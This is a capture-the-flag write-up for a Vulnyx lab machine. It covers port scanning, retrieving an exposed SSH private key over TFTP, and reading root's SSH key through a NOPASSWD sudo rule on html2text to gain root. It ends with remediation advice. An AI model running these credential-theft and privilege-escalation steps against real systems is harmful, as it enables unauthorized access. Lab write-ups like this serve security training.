---
title: Vulnyx - Beginner (CTF)
date: 2026-02-13 01:00:00 +0100
categories: [Vulnyx]
tags: [linux,network,exploitation]
toc: true
---

## Recon

### Full TCP Scan
First I started by running a full tcp port scan using nmap:

```bash
nmap -sV -sC -p- 192.168.163.129 --min-rate 8000
```

After reviewing the results, the following ports were open:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

I went ahead and visited the site `http://192.168.163.129` and I saw an interesting note:

![Website](/assets/img/vulnyx-beginner/Screenshot-2026-02-13-022320.png)

---

## Web Enumeration

Website message:

"It has sensitive exposed files, fix it as soon as possible."

Gobuster:

```bash
gobuster dir -u http://192.168.163.129 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

No useful results.

---

## UDP Enumeration
Since gobuster didn't have anything interesting I went ahead and did a UDP scan:

```bash
nmap -sU --top-ports 20 192.168.163.129 --open
```

After reviewing the results I saw TFTP was open:
```bash
PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp <--------
135/udp   open|filtered msrpc
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
1900/udp  open|filtered upnp
49152/udp open|filtered unknown
```

I went ahead and used `tftp-enum` script on nmap to see if I get anything interesting:

TFTP enum:

```bash
nmap -sU -p 69 --script=tftp-enum 192.168.163.129
```

After the results came up I saw `backup-config`:

```bash
PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum: 
|_  backup-config
```

---

## Initial Access

I downloaded the `backup-config` file:

```bash
tftp 192.168.163.129

tftp> get backup-config
tftp> quit
```

After extracting it I found 2 files:

- id_rsa
- sshd_config

I checked `sshd_config` and at the end of the file I found the username is boris.

Fix permissions:

```bash
chmod 600 id_rsa
```

Login:

```bash
ssh -i id_rsa boris@192.168.163.129
```

---

## User Flag

After logging in I went ahead and got the user flag:

```bash
cat user.txt
```

---

## Privilege Escalation
I checked if there were any binaries I could run as root without any password:

```bash
sudo -l
```

Boom! There is a binary I could run as root called `html2text`:

```
User boris may run the following commands on beginner:
    (root) NOPASSWD: /usr/bin/html2text
```

I went ahead and tried if I could dump the root ssh key by using `html2text`:

```bash
sudo html2text /root/.ssh/id_rsa
```

And there it was... the root ssh key.

---

## Fix Root Key

After copying the key to my machine I noticed that the format was a bit messed up and went and manually fixed it.

Then I fixed the key permission so I could ssh into root:

```bash
chmod 600 root_id_rsa
```

---

## Root Access

Went ahead and connected through ssh as root:

```bash
ssh -i root_id_rsa root@192.168.163.129
```

---

## Root Flag

Getting the root flag:

```bash
cat /root/root.txt
```

---

## Attack Chain

1. Nmap TCP
2. Web hint
3. UDP scan
4. TFTP leak
5. SSH key
6. User access
7. Sudo abuse
8. Root

---

## Security Issues

- Exposed TFTP
- Leaked SSH key
- Weak sudo rule

---

## Recommendations

- Disable TFTP
- Secure backups
- Harden sudo

---